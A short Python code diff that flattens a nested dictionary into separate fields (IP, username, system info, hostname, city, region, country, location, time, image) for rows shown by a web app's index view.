@@ -69,13 +69,11 @@ def index():
             r.get("ip", "N/A"),
             r.get("username", "N/A"),
             r.get("system_info", "N/A"),
-            {
-                "hostname": r.get("hostname", "N/A"),
-                "ciudad": r.get("ciudad", "N/A"),
-                "region": r.get("region", "N/A"),
-                "pais": r.get("pais", "N/A"),
-                "loc": r.get("loc", "N/A"),
-            },
+            r.get("hostname", "N/A"),
+            r.get("ciudad", "N/A"),
+            r.get("region", "N/A"),
+            r.get("pais", "N/A"),
+            r.get("loc", "N/A"),
             r.get("hora", "N/A"),
             r.get("imagen")
         ])
